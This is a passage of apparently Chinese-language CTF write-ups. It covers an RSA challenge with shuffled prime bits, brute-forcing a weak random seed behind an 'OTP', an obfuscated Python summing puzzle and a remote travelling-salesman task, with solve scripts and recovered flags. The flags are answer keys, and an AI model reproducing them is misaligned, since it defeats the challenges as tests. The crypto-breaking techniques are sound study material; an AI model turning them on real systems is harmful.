<span class="hljs-keyword">do</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">by</span> hand.<br></code></pre></td></tr></table></figure><p>两个附件一个算法一个输出。这里我放一起了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>bits = <span class="hljs-number">768</span><br>p,q = getPrime(bits),getPrime(bits)<br>n = p*q<br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(pt,e,n))<br>bit_p = <span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]<br>bit_q = <span class="hljs-built_in">bin</span>(q)[<span class="hljs-number">2</span>:]<br>parts = [bit_p[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_p[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_p[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits],bit_q[<span class="hljs-number">0</span>:bits//<span class="hljs-number">3</span>],bit_q[bits//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>],bit_q[<span class="hljs-number">2</span>*bits//<span class="hljs-number">3</span>:bits]]<br>random.shuffle(parts)<br><span class="hljs-built_in">print</span>(parts)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">54794426723900547461854843163768660308115034417111329528183606035659639395104723918632912086419836023341428265596988959206660015436864401403237748771765948022232575597127381504670391300908215025163138869313954305720403722718214862988965792884236612959443476803344992121865817757791519151566895512058656532409472494022672998848036223706004788146906885182892250477746430460414866512005225936680732094537985671236900243908114730784290372829952741399684135984046796</span><br><span class="hljs-string">[&#x27;0100101100001100010110110001000001001110010110110011101111100001101100000101000011111000101110011010010100101100011111000000101010011101100101010000101101110100100010101011100110001010001000000001000110000111011110011001101111110000100010000110000001110011&#x27;, &#x27;1100001100001100111110011110110101001100100000000100000100011110110010010101000011111111000100001000111001100110010010010011110110110010010110110100010110100011011100101001100001010111000100000110101010101011011110110110101010110100011110010000101010000111&#x27;, &#x27;1000100010110110010100111010100100111000100111100101100001011111100011000111110011101011011011100000101011000111010110010010011110100100110000001101110111001000000111100111011011000101010001111101000111100111110010011101011111100100111111011011110110101111&#x27;, &#x27;1111001101111101111111111111001010001111100010100000010110011011100000000110010110000011011110101110001000001111110101101101111000000111101111111000011101011010000110111100000110000001001101101010100000010011000100010111100001011000101101111000101101110100&#x27;, &#x27;1100100000100001010111110010000011000010100110101111100100011010111111110100011011111100001011101001010000100111100011100111000101110001001011110000000000000000000110111100000111100000111111010110010011000010011000110111001010000110011011111101011110000101&#x27;, &#x27;0001101000011011010011100100000011010101110110111001111011000001010101101111110100011011010011111010001111011011100011111110101110101101111100100011111110011111010100001100011000111011010111110101000011110101011110110001011110001111011001101100110100000101&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>这里是把pq各拆成3份混在一起了。所以枚举一下就可以解决。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>c = ...<br>parts = [...]<br>e = <span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(parts, <span class="hljs-number">3</span>):<br>    p = libnum.s2n(libnum.b2s(<span class="hljs-string">&quot;&quot;</span>.join(i)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sympy.isprime(p):<br>        <span class="hljs-keyword">continue</span><br>    d = sympy.mod_inverse(e, p-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">pow</span>(c,d,p)))<br>    <br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># b&#x27;flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;&#x27;</span><br><span class="hljs-comment"># flag&#123;flbg&#123;flcg&#123;fldg&#123;fleg&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="otp"><a class="markdownIt-Anchor" href="#otp"></a> otp</h2><p>Description：</p><figure class="highlight mizar"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mizar">&quot;the one-time pad (OTP) <span class="hljs-keyword">is</span> an encryption technique <span class="hljs-keyword">that</span> cannot <span class="hljs-keyword">be</span> cracked&quot; - Wikipedia<br></code></pre></td></tr></table></figure><p>两个文件一个输出一个代码，放一起了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secure_seed</span>():<br>x = <span class="hljs-number">0</span><br><span class="hljs-comment"># x is a random integer between 0 and 100000000000</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000000</span>):<br>x += random.randint(<span class="hljs-number">0</span>, random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">return</span> x<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag = bytes_to_long(flag)<br><br>random.seed(secure_seed())<br><br>l = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(flag)) - <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(l)<br><br>k = random.getrandbits(l)<br>flag = flag ^ k <span class="hljs-comment"># super secure encryption</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># 328</span><br><span class="hljs-comment"># 444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br></code></pre></td></tr></table></figure><p>没有啥思路，只能破解这个secure_seed是什么了。这个随机数的生成方式很奇怪。应为这样生成出来的随机数并不是在0~100000000000的，而是在25000000000附近的。这个结论你跑一个小规模的测试就能知道。即使这样我们很难去遍历他的周围，亿级别的搜索空间，好像也还是能遍历的。这边他生成出来的l还比flag多一位，我也不知道为啥，这里难道有什么可以利用的地方吗。</p><p>尝试爆破一下吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>start = <span class="hljs-number">100000000000</span>//<span class="hljs-number">4</span><br>l = <span class="hljs-number">328</span><br>cipher = <span class="hljs-number">444466166004822947723119817789495250410386698442581656332222628158680136313528100177866881816893557</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    random.seed(start + i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher^k):<br>        <span class="hljs-built_in">print</span>(start + i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher^k))<br>        <span class="hljs-keyword">break</span><br><br>    random.seed(start - i)<br>    k = random.getrandbits(l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> libnum.n2s(cipher ^ k):<br>        <span class="hljs-built_in">print</span>(start - i)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(cipher ^ k))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># 25000212790</span><br><span class="hljs-comment"># b&#x27;flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;\r\n&#x27;</span><br><br><span class="hljs-comment"># flag&#123;c3ntr4l_l1m1t_th30r3m_15431008597&#125;</span><br></code></pre></td></tr></table></figure><p>确实可以跑出来。</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="adding"><a class="markdownIt-Anchor" href="#adding"></a> adding</h2><p>Description：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This program <span class="hljs-keyword">is</span> taking too long... oh well addition <span class="hljs-keyword">is</span> too hard <span class="hljs-keyword">for</span> <span class="hljs-keyword">me</span><br><br>Please wrap <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> proper flag format (flag&#123;&#125;).<br></code></pre></td></tr></table></figure><p>看看代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">require = [], go = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> go:<br>        require.append(<span class="hljs-number">20</span>)<br>        <span class="hljs-keyword">return</span> require<br>        <br>    add = func1(go = <span class="hljs-literal">True</span>)<br>    require += add<br>    <span class="hljs-keyword">return</span> require<br><br>add = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">therealreal</span>(<span class="hljs-params">update</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">require = []</span>):<br>        require += update()<br>        <br>        <span class="hljs-keyword">global</span> add<br>        require.append(add)<br>        add += <span class="hljs-number">10</span><br>        <span class="hljs-keyword">return</span> require<br>    <br>    <span class="hljs-keyword">return</span> modify<br>    <br>use = therealreal(func1)<br>upto = <span class="hljs-number">213</span><br><br>calc = use()<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, upto+<span class="hljs-number">1</span>):<br>    calc = use(calc)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(calc))<br><br></code></pre></td></tr></table></figure><p>python是真的能写出花来…</p><p>手动分析分析的我云里雾里的，有些变量的变化完全搞不懂…不如来直接看结果。</p><p>我先讲upto改成了3然后讲calc打印出来看看。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[</span><br><span class="hljs-string">20, 20, 10, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 30, </span><br><span class="hljs-string">20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 40</span><br><span class="hljs-string">]</span><br></code></pre></td></tr></table></figure><p>这里其实可以看出来规律了。可以看到10，20，30，40算是一项的分界线。那么他们前面都是20这个数字。第一项20的个数是2个，而第二项是6个，后面是14，30。这里可以得到20的个数的递推式：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_n = 2(a_{n-1}+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>第一项为2。那么我们可以得到后面每次增加的20的个数。</p><p>还有就是10，20，30这个数列。直接加上就好了。</p><p>所以每次use返回的就是以下数列：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Y</mi><mi>n</mi></msub><mo>=</mo><mn>10</mn><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><mn>10</mn><msub><mi>b</mi><mi>n</mi></msub><mspace linebreak="newline"></mspace><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mn>2</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">Y_n = 10a_n + 10b_n \\a_n = 2(a_{n-1}+1) \\b_n = n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></span></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">an = [<span class="hljs-number">4</span>]<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    an.append(an[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)<br>bn = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">251</span>)]<br>Yn = [an[i] + bn[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bn))]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sum</span>(Yn[:<span class="hljs-number">214</span>])*<span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># 2106245833371143733958360553673408646377901908010982225086219772130</span><br><span class="hljs-comment"># flag&#123;2106245833371143733958360553673408646377901908010982225086219772130&#125;</span><br></code></pre></td></tr></table></figure><h1 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h1><p>这个分类，emmm有点像acm？</p><h2 id="travelling-salesman"><a class="markdownIt-Anchor" href="#travelling-salesman"></a> <strong>travelling-salesman</strong></h2><p>Description:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Euclidean</span> traveling salesman over single dimension? nc travelling-salesman.hsctf.com <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><p>有个算法附件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Task</span><br><span class="hljs-attribute">You</span> are handing out newspapers to classrooms in HSN. There is a list of classrooms given to you that you<br><span class="hljs-attribute">have</span> to visit. These classrooms are conveniently located in a single hallway, which has <span class="hljs-number">100</span> classrooms<br><span class="hljs-attribute">numbered</span> <span class="hljs-number">1</span> .. <span class="hljs-number">100</span> in order. Since you are lazy, you want to minimize your walking distance. Given that you<br><span class="hljs-attribute">must</span> start and end at classroom <span class="hljs-number">1</span>, output the order of classes to visit in order to minimize your walking<br><span class="hljs-attribute">distance</span>. If there are multiple solutions, output any.<br><span class="hljs-attribute">Interaction</span> Details:<br><span class="hljs-attribute">There</span> will be <span class="hljs-number">3</span> test cases.<br><span class="hljs-attribute">For</span> each test case, you will be given an array of integers representing the classrooms to visit. You will then be<br><span class="hljs-attribute">prompted</span> to enter a list of space separated integers representing the order in which the classrooms will be<br><span class="hljs-attribute">visited</span>.<br><span class="hljs-attribute">Sample</span> Interaction:<span class="hljs-meta"></span><br><span class="hljs-meta">[59, 68, 24, 83]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">59</span> <span class="hljs-number">83</span> <span class="hljs-number">68</span> <span class="hljs-number">24</span><span class="hljs-meta"></span><br><span class="hljs-meta">[27, 29, 43, 50, 78, 21, 70, 89, 93, 85]</span><br><span class="hljs-attribute">order</span>: <span class="hljs-number">27</span> <span class="hljs-number">29</span> <span class="hljs-number">43</span> <span class="hljs-number">50</span> <span class="hljs-number">78</span> <span class="hljs-number">21</span> <span class="hljs-number">70</span> <span class="hljs-number">89</span> <span class="hljs-number">93</span> <span class="hljs-number">85</span><br><span class="hljs-attribute">Distance</span> too large<br></code></pre></td></tr></table></figure><p>就是100个教室，我从第一个开始，走到给定的order的教室。要把全部需要的教室走完，最后回到1。这个其实直接排序就行了，最靠后的教室是一定要去的。所以我们只要走到最远的教室之中把需要的都走到就行，也就是排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;travelling-salesman.hsctf.com&quot;</span>, <span class="hljs-number">1337</span>)<br>r.recvline() <span class="hljs-comment"># == proof-of-work: disabled ==</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    order = <span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">b&quot;order:&quot;</span>).replace(<span class="hljs-string">b&quot;\norder:&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>))<br>    <span class="hljs-built_in">print</span>(order)<br>    r.send(<span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,<span class="hljs-built_in">sorted</span>(order)))).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-built_in">print</span>(r.recvline())<br></code></pre></td></tr></table></figure><p>就可以得到flag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[x] Opening connection to travelling-salesman.hsctf.com on port 1337<br>[x] Opening connection to travelling-salesman.hsctf.com on port 1337: Trying 34.147.9.219<br>[+] Opening connection to travelling-salesman.hsctf.com on port 1337: Done<br>[66, 57, 61, 98]<br>[81, 97, 50, 42, 52, 15, 36, 51, 31, 85]<br>[78, 71, 27, 17, 54, 55, 83, 77, 64, 45, 58, 40, 20, 35, 29, 86, 34, 22, 48, 43, 19, 73, 33, 81, 70, 94, 16, 65, 36, 79]<br>[61, 46, 59, 58, 87, 75, 64, 52, 66, 81, 76, 74, 11, 22, 72, 14, 34, 85, 37, 45, 24, 43, 19, 36, 20, 27, 79, 69, 53, 56, 13, 62, 35, 60, 16, 39, 42, 93, 48, 26, 29, 33, 54, 99, 38, 65, 83, 12, 50, 84]<br>[84, 42, 72, 59, 46, 40, 73, 96, 70, 62, 33, 22, 92, 43, 29, 49, 71, 27, 41, 37, 97, 78, 50, 98, 74, 87, 85, 51, 65, 55, 14, 39, 12, 34, 89, 38, 75, 28, 86, 19, 81, 83, 63, 36, 52, 25, 69, 58, 48, 32]<br>b&#x27; flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;\n&#x27;<br>[*] Closed connection to travelling-salesman.hsctf.com port 1337<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">flag&#123;the_fitness_gram_pacer_test_is_a_multistage_aerobic_capacity_test_8182295882010254837&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BCACTF 3.0</title>
